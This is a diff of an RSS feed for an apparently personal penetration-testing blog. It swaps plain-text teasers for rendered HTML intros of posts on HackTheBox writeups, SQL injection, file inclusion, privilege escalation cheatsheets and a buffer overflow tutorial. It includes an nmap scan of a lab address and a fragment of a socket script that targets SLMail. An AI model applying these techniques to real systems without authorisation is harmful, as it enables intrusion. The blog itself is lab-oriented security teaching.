+&lt;p&gt;Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems. Let&amp;rsquo;s jump right in.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -131,8 +776,39 @@ We are presented with just one service - HTTP, consists of three different sites
       <pubDate>Sat, 18 Jul 2020 14:37:47 +0000</pubDate>
       
       <guid>http://localhost:1313/sqli-0x03/</guid>
-      <description>SQL Injection 0x03 - Blind Boolean Attacks Introduction Blind SQL injection are the type of SQL injections attacks wherein no database error is received from the web responses, there are either subtle or no changes to the web page upon sending injection payloads. Since these changes are either subtle or non-existent, it becomes harder to identify and exploit these vulnerabilities but are certainly not impossible.
-Hi, welcome to the third part of the SQL injection series, if you haven&amp;rsquo;t read the first two posts and are a complete beginner I&amp;rsquo;d suggest you read them first - SQL Injection 0x01 - Introduction and SQL Injection 0x02 - Testing &amp;amp; UNION Attacks.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;sql-injection-0x03---blind-boolean-attacks&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;SQL Injection 0x03 - Blind Boolean Attacks
+  &lt;a href=&#34;#sql-injection-0x03---blind-boolean-attacks&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Blind SQL injection are the type of SQL injections attacks wherein no database error is received from the web responses, there are either subtle or no changes to the web page upon sending injection payloads. Since these changes are either subtle or non-existent, it becomes harder to identify and exploit these vulnerabilities but are certainly not impossible.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -141,8 +817,39 @@ Hi, welcome to the third part of the SQL injection series, if you haven&amp;rsqu
       <pubDate>Fri, 10 Jul 2020 22:31:47 +0000</pubDate>
       
       <guid>http://localhost:1313/sqli-0x02/</guid>
-      <description>SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&amp;rsquo;t read the first part of the series, you can read it here.
-In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;sql-injection-0x02---testing-and-union-attacks&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;SQL Injection 0x02 - Testing and UNION Attacks
+  &lt;a href=&#34;#sql-injection-0x02---testing-and-union-attacks&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Hi, welcome to the second post of the sql injection series, if you haven&amp;rsquo;t read the first part of the series, you can read it &lt;a href=&#34;http://localhost:1313/sqli-0x01&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -151,9 +858,39 @@ In this post I have focused on how to perform testing for error-based SQL inject
       <pubDate>Tue, 07 Jul 2020 01:43:22 +0000</pubDate>
       
       <guid>http://localhost:1313/hackthebox/htb-cronos/</guid>
-      <description>HackTheBox - Cronos Writeup w/o Metasploit Introduction Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&amp;rsquo;s jump in.
-Reconnaissance General Enumeration We&amp;rsquo;ll start out with an nmap scan. I always start with a quick initial scan. Command:
-nmap -Pn -n -oN nmap/initial 10.10.10.13Output: We can see that from the top 1000 ports only three are open:</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hackthebox---cronos-writeup-wo-metasploit&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;HackTheBox - Cronos Writeup w/o Metasploit
+  &lt;a href=&#34;#hackthebox---cronos-writeup-wo-metasploit&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&amp;rsquo;s jump in.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -162,9 +899,24 @@ nmap -Pn -n -oN nmap/initial 10.10.10.13Output: We can see that from the top 10
       <pubDate>Fri, 03 Jul 2020 16:22:37 +0000</pubDate>
       
       <guid>http://localhost:1313/sqli-0x01/</guid>
-      <description>SQL Injection 0x01 Hi, welcome to the first post of the SQL injection series. Before we dive into the &amp;ldquo;injection&amp;rdquo; part of it, let&amp;rsquo;s first understand the basics of what SQL is and the usual structure of a database-driven system.
-Structured Query Language (SQL) SQL is a database querying language which comes in various flavours like MySQL, MS-SQL, PostgreSQL, etc. In this series we&amp;rsquo;ll mainly focus on MySQL
-It&amp;rsquo;s a tabular database system, like Microsoft Excel simply put, with rows and columns.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;sql-injection-0x01&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;SQL Injection 0x01
+  &lt;a href=&#34;#sql-injection-0x01&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- 💉 Injections are pretty cool aren&#39;t they? 💉 --&gt;
+&lt;p&gt;Hi, welcome to the first post of the SQL injection series. Before we dive into the &amp;ldquo;injection&amp;rdquo; part of it, let&amp;rsquo;s first understand the basics of what SQL is and the usual structure of a database-driven system.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -173,8 +925,23 @@ It&amp;rsquo;s a tabular database system, like Microsoft Excel simply put, with 
       <pubDate>Tue, 30 Jun 2020 22:45:33 +0000</pubDate>
       
       <guid>http://localhost:1313/hack-oscp/</guid>
-      <description>Hack OSCP - A n00bs Guide Since I cleared OSCP plenty of folks asked me how to clear OSCP, and although I briefly mentioned it in my OSCP Journey post, it was not the whole picture and also not very accessible, and so I&amp;rsquo;m writing this post.
-Please note that PwK is a course you&amp;rsquo;re paying for to learn from, the course teaches you almost everything you need to learn and you&amp;rsquo;ll get to practice in the labs as well.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hack-oscp---a-n00bs-guide&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Hack OSCP - A n00bs Guide
+  &lt;a href=&#34;#hack-oscp---a-n00bs-guide&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;Since I cleared OSCP plenty of folks asked me how to clear OSCP, and although I briefly mentioned it in my &lt;a href=&#34;http://localhost:1313/oscp-journey&#34; target=&#34;_blank&#34;&gt;OSCP Journey&lt;/a&gt; post, it was not the whole picture and also not very accessible, and so I&amp;rsquo;m writing this post.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -183,8 +950,41 @@ Please note that PwK is a course you&amp;rsquo;re paying for to learn from, the 
       <pubDate>Mon, 29 Jun 2020 21:44:39 +0000</pubDate>
       
       <guid>http://localhost:1313/file-inclusion/</guid>
-      <description>File Inclusion Introduction File inclusion vulnerabilities are of two types: Remote File Inclusion (RFI) and Local File Inclusion (LFI). RFI is said to be present when a web application allows remote users to load and execute a remote file on the server. LFI is said to be present when a web application allows remote users to load any pre-existing file and execute it on the server.
-These vulnerabilities are often found in poorly written and/or deployed web applications which loads files or content to display it to the end-user, completely forgetting that this input could be modified.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;file-inclusion&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;File Inclusion
+  &lt;a href=&#34;#file-inclusion&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;File inclusion vulnerabilities are of two types: &lt;strong&gt;Remote File Inclusion (RFI)&lt;/strong&gt; and &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;.
+&lt;strong&gt;RFI&lt;/strong&gt; is said to be present when a web application allows remote users to load and execute a remote file on the server.
+&lt;strong&gt;LFI&lt;/strong&gt; is said to be present when a web application allows remote users to load any pre-existing file and execute it on the server.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -193,10 +993,27 @@ These vulnerabilities are often found in poorly written and/or deployed web appl
       <pubDate>Mon, 29 Jun 2020 16:33:08 +0000</pubDate>
       
       <guid>http://localhost:1313/privesc-linux/</guid>
-      <description>Linux Privilege Escalation Cheatsheet So you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
-Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins
-Note: This is a live document. I&amp;rsquo;ll be adding more content as I learn more
-Unstable shell Send yourself another shell from within the unstable shell</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;linux-privilege-escalation-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Linux Privilege Escalation Cheatsheet
+  &lt;a href=&#34;#linux-privilege-escalation-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;So you got a shell, what &lt;em&gt;now&lt;/em&gt;?
+This cheatsheet will help you with local enumeration as well as escalate your privilege further&lt;/p&gt;
+&lt;p&gt;Usage of different enumeration scripts are encouraged, my favourite is &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&#34;&gt;LinPEAS&lt;/a&gt;
+Another linux enumeration script I personally use is &lt;a href=&#34;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&#34;&gt;LinEnum&lt;/a&gt;
+Abuse existing functionality of programs using &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFOBins&lt;/a&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -205,8 +1022,40 @@ Unstable shell Send yourself another shell from within the unstable shell</descr
       <pubDate>Sat, 27 Jun 2020 10:26:58 +0000</pubDate>
       
       <guid>http://localhost:1313/oscp-journey/</guid>
-      <description>OSCP Journey From a persistent n00b who couldn&amp;rsquo;t even hack a medium difficulty machine on his own to cracking OSCP in 4 months!
-Background I wanted to do the PwK course and clear OSCP since past couple years but haven&amp;rsquo;t been able to due to reasons. Two of my certifications were going to expire in August &amp;lsquo;20, and I had to do a certification to renew them, a perfect opportunity. Before I started with the PwK course, I had very little experience with hacking or even CTF for that matter.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;oscp-journey&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;OSCP Journey
+  &lt;a href=&#34;#oscp-journey&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;From a persistent n00b who couldn&amp;rsquo;t even hack a medium difficulty machine on his own to cracking OSCP in 4 months!&lt;/p&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;background&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Background
+  &lt;a href=&#34;#background&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;I wanted to do the PwK course and clear OSCP since past couple years but haven&amp;rsquo;t been able to due to reasons. Two of my certifications were going to expire in August &amp;lsquo;20, and I had to do a certification to renew them, a perfect opportunity. Before I started with the PwK course, I had very little experience with hacking or even CTF for that matter. My college studies or previous certifications weren&amp;rsquo;t of any help here either. But I decided to take a deep breath, and dive in.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -215,11 +1064,45 @@ Background I wanted to do the PwK course and clear OSCP since past couple years 
       <pubDate>Fri, 26 Jun 2020 18:32:04 +0000</pubDate>
       
       <guid>http://localhost:1313/bof/</guid>
-      <description>Windows 32-Bit Buffer Overflow SLMail Example
-Practice these:
-SLMail - download from exploit-db Brainpan - download from vulnhub Step By Step Scripts All the scripts are available here as well as at the bottom.
-connect.py Making sure connection and all the operations are successfully performed is crucial as everything will be built on this script/step.
-import socketimport sysrhost = &amp;quot;192.168.&amp;quot;rport = 110try:s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((rhost,rport))print s.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;windows-32-bit-buffer-overflow&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Windows 32-Bit Buffer Overflow
+  &lt;a href=&#34;#windows-32-bit-buffer-overflow&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;SLMail Example&lt;/p&gt;
+&lt;p&gt;Practice these:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; SLMail - download from &lt;a href=&#34;https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe&#34;&gt;exploit-db&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Brainpan - download from &lt;a href=&#34;https://www.vulnhub.com/entry/brainpan-1,51/&#34;&gt;vulnhub&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;step-by-step-scripts&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Step By Step Scripts
+  &lt;a href=&#34;#step-by-step-scripts&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;All the scripts are available &lt;a href=&#34;https://github.com/krnb/scripts/tree/master/bof&#34;&gt;here&lt;/a&gt; as well as at the &lt;a onclick=&#34;go_bottom()&#34; style=&#34;cursor: pointer; &#34;&gt;bottom&lt;/a&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -228,12 +1111,26 @@ import socketimport sysrhost = &amp;quot;192.168.&amp;quot;rport = 110try:s
       <pubDate>Fri, 26 Jun 2020 18:05:42 +0000</pubDate>
       
       <guid>http://localhost:1313/privesc-windows/</guid>
-      <description>Windows Privilege Escalation Cheatsheet Latest updated as of: 12 / June / 2022
-So you got a shell, what now?
